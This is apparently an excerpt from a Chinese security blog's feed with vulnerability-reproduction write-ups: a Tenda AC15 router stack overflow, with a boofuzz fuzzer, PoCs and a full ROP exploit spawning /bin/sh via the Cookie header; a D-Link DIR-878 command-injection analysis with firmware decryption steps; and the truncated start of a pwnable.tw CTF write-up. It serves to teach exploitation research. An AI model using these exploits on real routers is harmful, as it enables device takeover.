response[:response.index(0)].decode(&apos;utf-8&apos;)</span><br><span class="line">    fuzz_data_logger.log_info(&quot;response check...\n&quot; + response.decode())</span><br><span class="line">    target.close()</span><br><span class="line">    return</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    options = &#123;</span><br><span class="line">        &quot;start_commands&quot;: [</span><br><span class="line">            &quot;sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;stop_commands&quot;: [&quot;echo stopping&quot;],</span><br><span class="line">        &quot;proc_name&quot;: [&quot;/usr/bin/qemu-arm-static ./httpd&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    procmon = ProcessMonitor(&quot;127.0.0.1&quot;, 26002)</span><br><span class="line">    procmon.set_options(**options)</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    session = Session(</span><br><span class="line">        target=Target(</span><br><span class="line">            connection=SocketConnection(IP, PORT, proto=&quot;tcp&quot;),</span><br><span class="line">            # monitors=[procmon]</span><br><span class="line">        ),</span><br><span class="line">        post_test_case_callbacks=[check_response],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s_initialize(name=&quot;Request&quot;)</span><br><span class="line">    with s_block(&quot;Request-Line&quot;):</span><br><span class="line">        # Line 1</span><br><span class="line">        s_group(&quot;Method&quot;, [&quot;GET&quot;])</span><br><span class="line">        s_delim(&quot; &quot;, fuzzable=False, name=&quot;space-1-1&quot;)</span><br><span class="line">        s_string(&quot;/goform/123&quot;, fuzzable=False)    # fuzzable 1</span><br><span class="line">        s_delim(&quot; &quot;, fuzzable=False, name=&quot;space-1-2&quot;)</span><br><span class="line">        s_static(&quot;HTTP/1.1&quot;, name=&quot;HTTP_VERSION&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-1&quot;)</span><br><span class="line">        # Line 2</span><br><span class="line">        s_static(&quot;Host&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-2-1&quot;)</span><br><span class="line">        s_string(&quot;192.168.0.5&quot;, fuzzable=False, name=&quot;IP address&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-2&quot;)</span><br><span class="line">        # Line 3</span><br><span class="line">        s_static(&quot;Connection&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-3-1&quot;)</span><br><span class="line">        s_string(&quot;keep-alive&quot;, fuzzable=False, name=&quot;Connection state&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-3&quot;)</span><br><span class="line">        # Line 4</span><br><span class="line">        s_static(&quot;Cookie&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-4-1&quot;)</span><br><span class="line">        s_string(&quot;bLanguage&quot;, fuzzable=False, name=&quot;key-bLanguage&quot;)</span><br><span class="line">        s_delim(&quot;=&quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;en&quot;, fuzzable=False, name=&quot;value-bLanguage&quot;)</span><br><span class="line">        s_delim(&quot;; &quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;password&quot;, fuzzable=False, name=&quot;key-password&quot;)</span><br><span class="line">        s_delim(&quot;=&quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;ce24124987jfjekfjlasfdjmeiruw398r&quot;, fuzzable=True)    # fuzzable 2</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-4&quot;)</span><br><span class="line">        # over</span><br><span class="line">        s_static(&quot;\r\n&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(&quot;Request&quot;))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>boofuzz提示出现错误（也可以通过访问<code>127.0.0.1:26000</code>进行图形化界面查看）</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/AC15fuzz_wrong.png" alt></p><p>根据fuzz结果编写一个测试poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># testPOC</span><br><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/execCommand&quot;%ip</span><br><span class="line">cookie = &#123;&quot;Cookir&quot;:&quot;password=&quot;+cyclic(600)&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><p><code>gdb-nultiarch</code>看到错误并没有跳到我们期望的随机地址，所以跟踪错误，查看原因</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15overflowBT.png" alt></p><p>可以看出，程序执行流程中，执行到了<code>ldrb  ip, [r3]</code>，会将存储地址为R3的字节数据读入IP，而此时的R3为<code>0x6561616e</code>，这个地址是非法的，无法访问该地址内的数据填入IP。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以我们可以考虑将该地址设置成合法地址（比如<code>0x2CEA8</code>，此处有显著打印<code>****** WeLoveLinux******</code>）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l naae</span><br><span class="line">452</span><br></pre></td></tr></table></figure><p>所以可以设置<code>&quot;password=&quot; + cyclic(452) + p32(0x2CEA8) + &quot;B&quot;*100</code>，测试了一下GG了。</p><p>这个偏移不对啊？再次测试的时候，偏移就变成了<strong>448</strong>，其实按照<code>char v34[128]; // [sp+304h] [bp-1C0h] BYREF</code>的大小也应该是448，所以再次修改<code>&quot;password=&quot; + cyclic(448) + p32(0x2CEA8) + &quot;B&quot;*100</code>，gdb中PC寄存器已被修改为我们的目标地址<code>0x2CEA8</code></p><p>这次程序开始持续刷新<code>0x2CEA8</code>处内容，成功利用。</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15RefreshWeloveLinux.png" alt></p><p>由于开启了NX，所以不能返回shellcode了。</p><p>考虑使用gadget控制R0，再跳转到system函数，从而执行<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0003B0F4                 MOV             R0, R3  ; command</span><br><span class="line">.text:0003B0F8                 BL              system</span><br></pre></td></tr></table></figure><p>在代码段中找到一条合适的，但是由于参数是由<code>R3-&gt;R0</code>，还是不方便控制参数，想想还有没有其他方法..</p><hr><p>继续看ida中，根据gdb报错地址<code>0x2c5cc</code>，回溯发现是由于读取password后进入了if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">if ( strlen(s) &lt;= 3</span><br><span class="line">      || (v43 = strchr(s, &apos;.&apos;)) == 0</span><br><span class="line">      || (v43 = (char *)v43 + 1, memcmp(v43, &quot;gif&quot;, 3u))</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;png&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;js&quot;, 2u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;css&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;jpg&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;jpeg&quot;, 3u) )</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if的条件是<strong>长度&lt;=3 || 不存在. || 不存在jpg&amp;png&amp;js…</strong>，所以跳出if的条件是<strong>长度&gt;3 &amp;&amp; 存在. &amp;&amp; 存在jpg或png或js….</strong></p><p>所以我们的password里需要存在.jpg就可以直接return返回，直接控制输入的password来布置堆栈就好了。（主要是不写.jpg这种，就会进入执行很多代码，对堆栈大洗盘，不好控制）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># testPOC2</span><br><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/execCommand&quot;%ip</span><br><span class="line">cookie = &#123;&quot;Cookir&quot;:&quot;password=&quot; + cyclic(444) + &quot;.jpg&quot; + p32(0x2CEA8) + &quot;B&quot;*100&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><p>使用ROPgadget查找可用的gadget，考虑使用栈来控制R0，最好控制的就是SP栈顶了，恰好找到了合适的gadget，该gadget会将栈顶赋值给R0，考虑将栈顶设置为<code>/bin/sh</code>，并跳转到R3。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libc.so.0 | grep &quot;mov r0, sp&quot;</span><br><span class="line">...</span><br><span class="line">0x00040cb8 : mov r0, sp ; blx r3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>继续寻找可以控制R3的gadget，将R3设置为<code>system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libc.so.0 --only &quot;pop&quot;</span><br><span class="line">...</span><br><span class="line">0x00018298 : pop &#123;r3, pc&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在gdb中<code>vmmap</code>查看libc基址，但是这里有个坑，通过该libc基址找到的system函数，虽然可以被gdb识别为system，但是并不能实现system，而gadget是可用的…所以直接<code>p system</code>找到可用system地址</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">context.binary = &quot;./bin/httpd&quot;</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/test&quot;%ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = 0xff5d5000</span><br><span class="line"># sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">sys_addr = 0xff7460f4</span><br><span class="line">gadget2 = libc_base + 0x40cb8# 0x40cb8 ; mov r0, sp ; blx r3</span><br><span class="line">gadget1 = libc_base + 0x18298# 0x18298 : pop &#123;r3, pc&#125;</span><br><span class="line">success(&quot;gadget1 = &quot;+hex(gadget1))</span><br><span class="line">success(&quot;gadget2 = &quot;+hex(gadget2))</span><br><span class="line"># [+] gadget1 = 0xff5ed298</span><br><span class="line"># [+] gadget2 = 0xff615cb8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot; + cyclic(444) + &quot;.jpg&quot; + p32(gadget1, endian=&quot;little&quot;) + p32(sys_addr, endian=&quot;little&quot;) + p32(gadget2, endian=&quot;little&quot;) + &quot;/bin/sh\x00&quot;&#125;</span><br><span class="line"></span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><h1 id="待"><a href="#待" class="headerlink" title="待"></a>待</h1><h2 id="GoAhead"><a href="#GoAhead" class="headerlink" title="GoAhead"></a>GoAhead</h2><p>关于这个GoAhead，可以下载源码<a href="https://github.com/Grant999/goahead-1，简单分析发现`websUrlHandlerDefine`这个函数，和调用了漏洞函数`R7WebsSecurityHandler`的函数很类似，所以推断这应该就是用户二次开发GoAhead中的`websSecurityHandler`或者自定义的函数。" target="_blank" rel="noopener">https://github.com/Grant999/goahead-1，简单分析发现`websUrlHandlerDefine`这个函数，和调用了漏洞函数`R7WebsSecurityHandler`的函数很类似，所以推断这应该就是用户二次开发GoAhead中的`websSecurityHandler`或者自定义的函数。</a></p><p>但是关于这里的结构体由来，我还不是很清楚…</p><h2 id="fuzz-1"><a href="#fuzz-1" class="headerlink" title="fuzz"></a>fuzz</h2><p>首先是fuzz相关知识=无，boofuzz的使用也没有掌握，官方文档看起来不友好，语法不会…只能看着别人的脚本依葫芦画瓢。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>每次分析程序的时候虽然可以大概理清楚需要什么，但是不够..果断？反汇编和反编译读的太笼统，还有一些函数的掌握不到位，GG</p><p>只在测试了解只是用/goform是不能的，比如要再加上一个uri –&gt; /goform/xxx才行</p><blockquote><p>Reference:</p><p><a href="http://www.tearorca.top/index.php/2020/04/05/%E5%88%9D%E6%8E%A2boofuzz/#i-6" target="_blank" rel="noopener">http://www.tearorca.top/index.php/2020/04/05/%E5%88%9D%E6%8E%A2boofuzz/#i-6</a></p><p><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/</a></p><p><a href="https://zhuanlan.zhihu.com/p/43432370" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43432370</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/104334096" target="_blank" rel="noopener">https://blog.csdn.net/song_lee/article/details/104334096</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/113800058" target="_blank" rel="noopener">Tenda AC15 路由器 CVE-2018-5767 / CVE-2020-10987 fuzz</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;影响产品：Tenda AC15路由器&lt;/p&gt;
&lt;p&gt;影响版本：5767：V15.03.05.16 &amp;amp; 10987：V15.03.05.18&lt;/p&gt;
&lt;p&gt;固件下载链接（V15.03.05.16）：&lt;a href=&quot;https://down.tendacn.com/u</summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="fuzz" scheme="p1Kk.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>DLink DIR-878 CVE-2019-8316 命令执行漏洞复现（没环境</title>
    <link href="p1Kk.github.io/2021/03/14/iot/DLink%20DIR-878%20CVE-2019-8316%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>p1Kk.github.io/2021/03/14/iot/DLink%20DIR-878%20CVE-2019-8316%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-03-13T16:00:00.000Z</published>
    <updated>2021-04-14T13:00:48.414Z</updated>
    
    <content type="html"><![CDATA[<p>影响版本：v1.12之前</p><p>固件下载地址：<a href="https://tsd.dlink.com.tw/" target="_blank" rel="noopener">https://tsd.dlink.com.tw/</a>  选择下载DIR-878 v1.12 &amp; v1.04</p><p>漏洞详情：<a href="https://www.seebug.org/vuldb/ssvid-97802" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97802</a></p><h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>和以前的固件直接解包不太一样，v1.12是加密了的固件版本，而从图中可以看出，v1.10是第一个加密的版本且v1.04还未加密。</p><p>这种类型属于<code>设备固件出厂时未加密，也不包含任何解密例程。解密例程与固件的未加密版本(v1.04)一起以更高版本(v1.10)一起提供，以用于将来的加密固件更新，随后的固件版本将被加密</code>。在这个方案中，我们可以从固件v1.04获取解密例程，并使用它来解密新的固件v1.12版本</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/v104110.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk DIR878A1_FW1.12B01_Encrypt.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># 被加密</span><br><span class="line">$ binwalk DIR878A1_FW104B05_Middle_FW_Unencrypt.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0xC41C48E6, created: 2018-02-03 10:12:31, image size: 10448690 bytes, Data Address: 0x81001000, Entry Point: 0x81611F40, data CRC: 0x64113D8A, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 15907264 bytes</span><br><span class="line">68516         0x10BA4         MySQL MISAM index file Version 6</span><br><span class="line"></span><br><span class="line"># 未加密</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR878A1_FW104B05_Middle_FW_Unencrypt.bin </span><br><span class="line">$ cd _DIR878A1_FW104B05_Middle_FW_Unencrypt.bin.extracted/_A0.extracted/_8AB758.extracted/cpio-root</span><br><span class="line"># 进入了根目录</span><br><span class="line">$ find ./ -name *crypt*</span><br><span class="line">...</span><br><span class="line">./bin/imgdecrypt</span><br><span class="line"># 找到了</span><br><span class="line">$ file ./bin/imgdecrypt </span><br><span class="line">./bin/imgdecrypt: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"># 文件为LSB 小端 mipsel</span><br><span class="line">$ cp $(which qemu-mipsel-static) ./</span><br><span class="line"># 将DIR878A1_FW1.12B01_Encrypt.bin粘贴到根目录后再解密，否则无效</span><br><span class="line">$ sudo chroot ./ ./qemu-mipsel-static ./bin/imgdecrypt ./DIR878A1_FW1.12B01_Encrypt.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line"># 输出了key 解密成功，再移回到原来的目录下</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR878A1_FW1.12B01_Encrypt.bin </span><br><span class="line"># 然后一样的 到根目录去...</span><br></pre></td></tr></table></figure><h2 id="sys-mod（failed"><a href="#sys-mod（failed" class="headerlink" title="sys-mod（failed"></a>sys-mod（failed</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo guestmount -a debian_wheezy_mipsel_standard.qcow2 -m /dev/sda1 /mnt</span><br><span class="line"><span class="meta">$</span> sudo cp -rf ./cpio-root/ /mnt/root/</span><br><span class="line"><span class="meta">$</span> sudo guestunmount /mnt </span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo tunctl -t tap0 -u `whoami`</span><br><span class="line"><span class="meta">$</span> sudo ifconfig tap0 192.168.65.1/24</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>乌鱼子…模拟不起来…😭</p><p>在公网上也没有找到可用的路由器…</p><p>直接分析吧…</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="目标文件分析"><a href="#目标文件分析" class="headerlink" title="目标文件分析"></a>目标文件分析</h2><p>根据漏洞详情，定位到目标文件<code>librcm.so</code>中的目标函数<code>tw_add_url_filter_iptables_rule</code></p><p>可以发现存在命令注入</p><p>流程为<code>load_iptables -&gt; upload_url_filter_rules -&gt; tw_add_url_filter_iptables_rule &amp; tw_add_url_allow_filter_iptables_rule</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/878bugstart.png" alt></p><p>在twsystem函数中</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/twsystem.png" alt></p><p>查找一下上面<code>tw_add_url_filter_iptables_rule</code>引用处，注意到了下面有一个差不多的函数，都一样的。</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/878next.png" alt></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>在站点过滤处，修改<code>站点URL\域</code>，需要注意url的预处理过程，函数会根据/来截取域名，所以不要用/…</p><p>前端无法注入，使用burp抓包修改即可。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>在DIR-878路由器中，还有很多类似的命令注入如CVE-2019-8317\8318\8319（漏洞在<code>/bin/rc</code>中），都是由<code>twsystem</code>完成，程序对很多输入并没有进行过滤或检测。</p><p>以后分析要更透彻才行哦…</p><blockquote><p>Reference</p><p><a href="https://www.heibai.org/post/1395.html" target="_blank" rel="noopener">D-Link路由器HNAP协议系列漏洞披露</a></p><p><a href="https://github.com/lieanu/vuls/blob/master/dlink/DIR-878/webfilter.md" target="_blank" rel="noopener">https://github.com/lieanu/vuls/blob/master/dlink/DIR-878/webfilter.md</a></p><p><a href="https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw" target="_blank" rel="noopener">路由器加密固件的解密</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;影响版本：v1.12之前&lt;/p&gt;
&lt;p&gt;固件下载地址：&lt;a href=&quot;https://tsd.dlink.com.tw/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://tsd.dlink.com.tw/&lt;/a&gt;  选择下载DIR-878 </summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
    <category term="命令执行" scheme="p1Kk.github.io/tags/命令执行/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw death_note wp</title>
    <link href="p1Kk.github.io/2021/03/13/tw/tw%20death_note/"/>
    <id>p1Kk.github.io/2021/03/13/tw/tw%20death_note/</id>
    <published>2021-03-12T16:00:00.000Z</published>
    <updated>2024-07-31T10:32:27.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>开了canary，nx没开</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/notebug.png" alt></p><p>漏洞很明显，数组下标只判断了是否&gt;10，如果设置index为负数，可以造成越界写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048460↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048460+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset strdup        ; DATA XREF: _strdup↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset __stack_chk_fail</span><br><span class="line">.got.plt:0804A01C                                         ; DATA XREF: ___stack_chk_fail↑r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0804A024 off_804A024     dd offset exit          ; DATA XREF: _exit↑r</span><br><span class="line">.got.plt:0804A028 off_804A028     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A02C off_804A02C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A02C                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A030 off_804A030     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0804A034 off_804A034     dd offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0804A034 _got_plt        ends</span><br><span class="line">.got.plt:0804A034</span><br><span class="line">......</span><br><span class="line">.bss:0804A060                 public note</span><br><span class="line">.bss:0804A060 ; void *note[10]</span><br><span class="line">.bss:0804A060 note            dd ?                    ; DATA XREF: add_note+91↑w</span><br><span class="line">.bss:0804A060                                         ; del_note+41↑r ...</span><br></pre></td></tr></table></figure><p>got表和bss的距离，可以改got为shellcode地址，free_got和note的偏移即note[-19]</p><p>同时要注意，add时在<code>is_printable</code>会判断写入的是否是可显的【<a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ascii码对照表</a>】…所以就是考察写shellcode的能力了o3o</p><p>也就是</p><p> <code>mov a,b</code>用 <code>push b;pop 